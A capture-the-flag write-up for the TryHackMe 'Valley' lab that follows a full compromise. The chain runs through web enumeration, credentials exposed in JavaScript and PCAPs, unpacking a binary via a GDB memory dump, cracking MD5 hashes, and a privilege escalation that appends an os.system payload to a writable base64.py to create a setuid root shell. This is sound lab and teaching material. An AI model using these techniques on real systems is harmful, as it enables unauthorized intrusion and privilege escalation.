# Valley CTF Write-up

Valley

Can you find your way into the Valley?

Room: https://tryhackme.com/room/valleype

## overview

This machine involved:

- web enumeration
- client-side credential discovery
- PCAP analysis
- reverse engineering a packed binary
- privilege escalation via Python module hijacking

---

# initial access

## port scanning

We started with a full TCP scan to identify exposed services:

```bash
nmap -p- -sC -sV 10.48.151.246
```

```text
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp    open  http    Apache httpd 2.4.41
37370/tcp open  ftp     vsftpd 3.0.3
```

Three services stood out:

- HTTP
- FTP on a non-standard port
- SSH for later credential reuse

---

## web enumeration

We began enumerating the web server with Gobuster using the wordlist:

```bash
gobuster dir -u http://10.48.151.246 -w /usr/share/wordlists/dirb/big.txt -x txt,js,html,bak,old,zip,tar,log -t 50
```

This revealed:

```text
/pricing/note.txt
```

Opening it showed:

```text
J,
Please stop leaving notes randomly on the website
-RP
```

This was a useful clue. It suggested there were likely more notes left elsewhere on the site, so instead of treating it as an isolated file, we kept hunting for similar developer breadcrumbs.

---

## finding more developer notes

```bash
gobuster dir -u http://10.48.151.246/static -w /usr/share/wordlists/dirb/big.txt -x txt,js,html,bak,old,zip,tar,log -t 50
```

That paid off when we found:

```text
/static/00
```

Contents:

```text
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

The important part here was the hidden-looking path:

```text
/dev1243224123123
```

---

## hidden development panel

Browsing to:

```text
http://10.48.151.246/dev1243224123123/
```

showed a login page.

Rather than trying to brute force it immediately, we checked the client-side JavaScript:

```text
view-source:http://10.48.151.246/dev1243224123123/dev.js
```

Relevant logic:

```javascript
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "**********") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})

```

This was a straight client-side auth check, so the creds were simply exposed in the JavaScript.

Recovered creds:

- `siemDev`
- password masked in this write-up

---

## ftp pivot

Using the dev panel creds led to:

```text
/dev1243224123123/devNotes37370.txt
```

Contents:

```text
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

The line about reusing credentials strongly suggested the same creds might work on FTP.

We tested that against the FTP service on `37370`.

```bash
ftp 10.48.151.246 37370
```

Session:

```text
Connected to 10.48.151.246.
220 (vsFTPd 3.0.3)
Name (10.48.151.246:root): siemDev
331 Please specify the password.
Password:
230 Login successful.
```

---

## ftp loot

Listing the FTP directory showed:

```text
siemFTP.pcapng
siemHTTP1.pcapng
siemHTTP2.pcapng
```

These captures became the main source of the next pivot.

---

## red herring from the ftp pcap

One of the first things noticed in the FTP capture was a reference to these files:

```text
AnnualReport.txt
BusinessReport.txt
CISOReport.txt
HrReport.txt
ItReport.txt
SecurityReport.txt
```

We tried to find them:

```bash
find / -type f \( -name "AnnualReport.txt" -o -name "BusinessReport.txt" -o -name "CISOReport.txt" -o -name "HrReport.txt" -o -name "ItReport.txt" -o -name "SecurityReport.txt" \) 2>/dev/null
```

Nothing useful turned up, even later after root access.

This ended up being a red herring. It looked valuable, it consumed time, and it never paid off. It is worth keeping in the write-up because it shows a realistic dead end during the investigation.

---

## http pcap analysis

The HTTP captures were much more useful.

In one of the http captures, we found a POST request containing credentials:

```http
POST /index.html HTTP/1.1
Host: 192.168.111.136
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://192.168.111.136
Connection: keep-alive
Referer: http://192.168.111.136/index.html
Upgrade-Insecure-Requests: 1

uname=valleyDev&psw=**********&remember=on
```

Recovered creds:

- `valleyDev`
- password masked in this write-up

---

## ssh access as valleyDev

We tested the HTTP-derived creds over SSH:

```bash
ssh valleyDev@10.48.151.246
```

Login succeeded.

```text
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)
```

The user flag was available:

```bash
cat user.txt
```

```text
THM{************************}
```

---

## pivot to valley

### finding valleyAuthenticator

While exploring `/home`, we found a suspicious binary:

```text
/ home/valleyAuthenticator
```

Running it showed a simple auth prompt:

```text
Welcome to Valley Inc. Authenticator
What is your username:
What is your password:
Wrong Password or Username
```

At first glance, it looked like a straightforward local credential gate.

---

### failed brute force attempt

We initially tried automating guesses with pwntools:

```python
from pwn import *

binary = "./valleyAuthenticator"

with open("users.txt", "r", encoding="utf-8", errors="ignore") as f:
    usernames = [x.strip() for x in f if x.strip()]

with open("passes.txt", "r", encoding="utf-8", errors="ignore") as f:
    passwords = [x.strip() for x in f if x.strip()]

for u in usernames:
    for p in passwords:
        io = process(binary)
        io.recvuntil(b"What is your username: ")
        io.sendline(u.encode())
        io.recvuntil(b"What is your password: ")
        io.sendline(p.encode())
        out = io.recvall(timeout=1).decode(errors="ignore")
        io.close()

        if "Wrong Password or Username" not in out:
            print(f"FOUND -> {u}:{p}")
            print(out)
            raise SystemExit

print("No hit")
```

This produced no useful results. That pushed us toward reversing rather than guessing.

---

## reverse engineering valleyAuthenticator

### initial triage

We pulled the binary down for deeper analysis. A simple way to do that from the target was to host it with Python:

```bash
cd /home
python3 -m http.server
```

Then retrieve it down the attack box.

```bash
wget http://10.48.151.246:8000/valleyAuthenticator
```

Initial file triage:

```bash
file valleyAuthenticator
```

Output showed it was not a nice, simple dynamic binary:

```text
valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
```

This already suggested:

- static linking
- stripped or intentionally malformed section data
- likely more annoying than a normal crackme

We then checked the entry point:

```bash
objdump -f valleyAuthenticator
```

```text
valleyAuthenticator:     file format elf64-x86-64
architecture: i386:x86-64, flags 0x00000102:
EXEC_P, D_PAGED
start address 0x000000000049a3e8
```

We initially used `strings` during analysis. With more time and careful filtering, it likely would have revealed the required information. However, rather than fully pursuing this path, we moved to dynamic analysis. 
If using `strings`, it is recommended to pipe the output into `less` and search for relevant keywords such as `pass`, `user`, or `auth` to quickly identify potentially useful data.

```
A [3    <
?ATs
-^;x&
e6722920bab2326###
bf6b1b##
ddJ1cc76##
beb60709056c###
elcome to Valley Inc. Authentica
[k0rHh
 is your usernad
Ol: /passwXd.{
~{edJrong P= 
sL_striF::_M_M
v0ida%02xo
~ c-74

```

---

### runtime analysis with strace

The next question was whether the program read credentials from a file or used anything external.

```bash
strace ./valleyAuthenticator
```

The trace showed:

- prompt printed
- username read from stdin
- password read from stdin
- failure message printed
- no obvious credential file opened

That strongly suggested the secret was embedded or computed internally.

---

### gdb gets messy

We tried stepping with GDB, breaking around `read` and `write`, and inspecting buffers. That helped confirm input locations, but it quickly became clear we were not yet in the real application logic.

Instead of clean auth code, we kept landing in:

- syscall wrappers
- memcpy-like routines
- stream handling
- odd bit-manipulation functions
- functions that looked more like decompression or loader stubs than credential checks

That was the big clue.

The binary was not just stripped. It was effectively unpacking or relocating logic at runtime.

---

### unpacking clue

Some decompiled functions looked like a bitstream decoder with copy-back routines. One helper clearly resembled a back-reference copy routine, which is typical of LZ-style decompression logic rather than auth logic.

That explained why walking forward from the on-disk entry point in Ghidra was frustrating. We were spending time in the packer or loader stub, not the real program.

---

### dumping the unpacked binary from memory

Once it became clear that the binary was not executing its real logic directly (and instead performing some form of runtime unpacking), continuing to step through it in GDB or statically analyze it in Ghidra was no longer efficient.

At this point, the better approach was to:

- let the binary unpack itself in memory  
- pause execution before it exits  
- dump the unpacked memory region  

---

### starting gdb

We begin by launching the binary inside GDB:

```bash
gdb ./valleyAuthenticator
```
---

### breaking before program exit

We need to stop execution **after unpacking has occurred**, but **before the program exits**, otherwise we lose access to the unpacked code in memory.

A clean way to do this is to catch the `exit` syscall:

```gdb
catch syscall exit
```

Then run the program:

```gdb
run
```

When prompted, enter any values:

```text
What is your username:
test
What is your password:
test
```

The actual input does not matter — we only need the program to progress far enough to unpack itself.

---

### execution stops automatically

Because of the `catch syscall exit`, GDB will automatically pause execution when the binary attempts to terminate.

At this point:

- the unpacking routine has already executed  
- the real program logic now exists in memory  
- we are in the ideal state to dump it  

---

### identifying memory regions

We can inspect the process memory layout:

```gdb
info proc mappings
```

Example output (trimmed):

```text
0x400000 - 0x5bc000
```

This region corresponds to the main executable mapping and is what we want to dump.

---

### dumping memory

We now dump the in-memory image:

```gdb
dump memory unpacked.bin 0x400000 0x5bc000
```

This creates a raw binary containing the unpacked program.

---

### why this works

The binary performs runtime unpacking.

If we attempt to analyze the original file directly:

- we only see the packed stub  
- functions appear meaningless or misleading  
- control flow is difficult to follow  

By dumping memory **after execution has progressed**, we capture:

- the fully unpacked code  
- resolved control flow  
- real strings and references  

---

### loading into ghidra

The dumped file is then loaded into Ghidra as a raw binary:

- **base address:** `0x400000`  
- **architecture:** x86-64  

Once loaded:

- strings become visible  
- cross-references resolve cleanly  
- the authentication logic is much easier to locate  

---

### locating the real auth function

In the unpacked dump, we found the key strings:

- `What is your username:`
- `What is your password:`
- `Authenticated`
- `Wrong Password or Username`

All of them pointed back into the same function.

That function looked like this in decompiled form:

```c
undefined8 FUN_00004585(void)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  char cVar4;
  undefined8 uVar5;
  undefined local_148 [32];
  undefined local_128 [32];
  undefined local_108 [32];
  undefined local_e8 [46];
  undefined local_ba;
  undefined local_b9;
  undefined local_b8 [32];
  undefined local_98 [32];
  undefined local_78 [32];
  undefined local_58 [40];

  FUN_00007270(&local_ba);
  FUN_00004b76(local_e8,s_e6722920bab2326f8217e4#################_0015c008,&local_ba,
               s_e6722920bab2326f821#################_0015c008);
  FUN_00007290(&local_ba);
  FUN_00007270(&local_b9);
  FUN_00004b76(local_108,s_dd2921cc76ee3abfd2be#################_0015c030,&local_b9,
               s_dd2921cc76ee3abfd2beb60#################_0015c030);
  FUN_00007290(&local_b9);
  FUN_00071180(local_128);
  FUN_00071180(local_148);
  FUN_0006b520(0x1bf4e0,s_Welcome_to_Valley_Inc._Authentic_0015c058);
  FUN_0006a0f0(0x1bf4e0,0x46ae70);
  FUN_0006b520(0x1bf4e0,s_What_is_your_username:_0015c07d);
  FUN_00007df0(0x1bf600,local_128);
  FUN_0006b520(0x1bf4e0,s_What_is_your_password:_0015c095);
  FUN_00007df0(0x1bf600,local_148);
  bVar2 = false;
  bVar1 = false;
  FUN_000739a0(local_98,local_128,local_128);
  FUN_00006061(local_b8,local_98,local_98);
  cVar4 = FUN_00004c0e(local_b8,local_108,local_108);
  if (cVar4 != '\0') {
    FUN_000739a0(local_58,local_148,local_148);
    bVar2 = true;
    FUN_00006061(local_78,local_58,local_58);
    bVar1 = true;
    cVar4 = FUN_00004c0e(local_78,local_e8,local_e8);
    if (cVar4 != '\0') {
      bVar3 = true;
      goto LAB_00004797;
    }
  }
  bVar3 = false;
LAB_00004797:
  if (bVar1) {
    FUN_00071290(local_78);
  }
  if (bVar2) {
    FUN_00071290(local_58);
  }
  FUN_00071290(local_b8);
  FUN_00071290(local_98);
  if (bVar3) {
    uVar5 = FUN_0006b520(0x1bf4e0,s_Authenticated_0015c0ad);
    FUN_0006a0f0(uVar5,0x46ae70,0x46ae70);
  }
  else {
    uVar5 = FUN_0006b520(0x1bf4e0,s_Wrong_Password_or_Username_0015c0bb);
    FUN_0006a0f0(uVar5,0x46ae70,0x46ae70);
  }
  FUN_00071290(local_148);
  FUN_00071290(local_128);
  FUN_00071290(local_108);
  FUN_00071290(local_e8);
  return 0;
}
```

---

### understanding the auth flow

The important part was not every helper name, but the overall logic.

The function:

1. loads two fixed 32-character hex strings
2. prompts for username
3. prompts for password
4. transforms each input through helper functions
5. compares each transformed value against the stored string
6. prints `Authenticated` only if both comparisons succeed

That meant the program was not storing plaintext credentials. It was comparing transformed values, and the two fixed values looked like hashes:

- `dd2921cc76ee3a#################`
- `e6722920bab2326#################`

---

### identifying the hash type

Both values were 32 hex characters long, which is a classic MD5 shape.

One cracked immediately:

```text
dd2921cc76ee3abfd################# = valley
```

The second cracked to the valley password, masked here.

Recovered creds:

- `valley`
- password masked in this write-up

---

### pivot to valley

With that recovered, we could simply switch users:

```bash
su valley
```

Enter the recovered password.

At this point, the binary had served its purpose. The important lesson was that brute force was a bad use of time here. Dumping the unpacked memory and reading the real auth function was the winning path.

---

## privilege escalation

### initial enumeration

As `valley`, we checked groups:

```bash
id
```

Output:

```text
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
```

The custom group `valleyAdmin` was immediately suspicious.

---

### group-based file discovery

We searched for files associated with that group:

```bash
find / -group valleyAdmin 2>/dev/null
```

Results:

```text
/usr/lib/python3.8
/usr/lib/python3.8/base64.py
```

Checking permissions:

```bash
ls -la /usr/lib/python3.8/base64.py
```

```text
-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13  2023 /usr/lib/python3.8/base64.py
```

This was the key misconfiguration.

- owned by `root`
- writable by `valleyAdmin`
- `valley` is in `valleyAdmin`

So we could modify a Python standard library module that root-owned Python scripts might import.

---

### finding a root-owned python script

Eventually we found:

```bash
cd /photos/script
ls -la
cat photosEncrypt.py
```

Contents:

```python
#!/usr/bin/python3
import base64
for i in range(1,7):
	image_path = "/photos/p" + str(i) + ".jpg"

	with open(image_path, "rb") as image_file:
          image_data = image_file.read()

	encoded_image_data = base64.b64encode(image_data)

	output_path = "/photos/photoVault/p" + str(i) + ".enc"

	with open(output_path, "wb") as output_file:
    	  output_file.write(encoded_image_data)
```

This was perfect.

It was root-owned, used Python 3, and imported `base64`.

That meant modifying `base64.py` would execute our code as soon as the script imported it.

---

### exploit

First back up the original module:

```bash
cp /usr/lib/python3.8/base64.py /tmp/base64.py.bak
```

Then append a payload:

```bash
echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")' >> /usr/lib/python3.8/base64.py
```

Then trigger the import path by running the Python script:

```bash
python3 /photos/script/photosEncrypt.py
```

The script produced permission-related errors later in execution, but that did not matter. The payload ran at import time.

we noted this behavior during exploitation:

```text
cp: cannot create regular file '/tmp/rootbash': Permission denied
chmod: changing permissions of '/tmp/rootbash': Operation not permitted
cp: cannot create regular file '/tmp/rootbash': Permission denied
Traceback (most recent call last):
  File "photosEncrypt.py", line 18, in <module>
    with open(output_path, "wb") as output_file:
PermissionError: [Errno 13] Permission denied: '/photos/photoVault/p1.enc'
```

Even with those messages, the shell was already usable:

```bash
/tmp/rootbash -p
```

```text
rootbash-5.0# whoami
root
```

```bash
cat \root\root.txt
```
```text
THM{************************}
```

This is a classic example of import-time code execution. The payload runs as soon as Python processes the malicious `base64.py`, before the rest of the script fails.

---

## key takeaways

The main path was:

1. enumerate the web app
2. follow developer note breadcrumbs
3. recover client-side creds for `siemDev`
4. reuse them on FTP
5. inspect PCAPs
6. recover `valleyDev` creds from HTTP traffic
7. SSH in as `valleyDev`
8. reverse engineer `valleyAuthenticator`
9. recover `valley` creds from the unpacked binary
10. exploit writable `base64.py` to hijack a root-owned Python script
11. obtain root

Important red herrings included:

- the report filenames seen in the FTP PCAP
- the time spent trying to brute force `valleyAuthenticator`
- investigating the `exp_dir` directory and its symlink (`uaf -> ./data`), which appeared suspicious but was not used in exploitation
